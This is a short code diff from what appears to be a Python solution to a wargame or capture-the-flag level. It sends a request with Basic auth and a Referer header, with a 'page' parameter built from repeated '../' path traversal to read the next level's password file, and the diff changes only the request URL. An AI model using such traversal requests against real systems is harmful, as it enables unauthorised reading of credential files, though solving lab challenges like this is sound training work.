@@ -17,7 +17,7 @@ auth_creds = base64.b64encode(credentials.encode("ascii"))
 heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}
 
 include_folder = "../" * 7 + ".." + folder + next_level_username
-request_url = level_url + "?page=" + include_folder
+request_url = level_url + "index.php?page=" + include_folder
 response = requests.get(request_url, headers=heads)
 
 data = response.text
